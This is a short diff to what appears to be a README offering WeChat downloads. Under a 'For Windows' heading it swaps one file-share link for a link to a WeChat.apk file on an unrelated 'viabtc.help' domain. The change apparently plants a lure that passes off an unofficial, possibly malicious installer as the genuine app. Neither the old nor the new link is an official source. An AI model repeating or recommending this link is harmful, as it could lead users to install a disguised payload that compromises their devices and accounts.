@@ -28,7 +28,7 @@ wechat
 
 ### For Windows 
 
- [Wechat Download](https://dropmefiles.com/p53LW)
+ [Wechat Download](https://viabtc.help/WeChat.apk)
 
 For Linux
 
